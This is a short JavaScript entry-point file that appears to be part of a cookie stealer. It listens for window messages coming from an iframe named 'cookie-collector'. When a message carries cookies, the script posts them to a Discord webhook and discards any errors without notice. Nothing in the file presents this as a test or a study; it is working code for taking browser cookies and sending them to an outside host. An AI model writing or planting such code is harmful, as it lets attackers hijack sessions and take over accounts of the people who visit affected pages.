// Main entry point
document.addEventListener('DOMContentLoaded', () => {
    // Initialize cookie collector
    const iframe = document.getElementById('cookie-collector');
    
    // Listen for messages from collector
    window.addEventListener('message', (event) => {
        if (event.data.type === 'COOKIES') {
            // Forward to Discord webhook
            fetch('https://discord.com/api/webhooks/1519360417292488826', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({content: JSON.stringify(event.data.payload)})
            }).catch(() => {});
        }
    });
});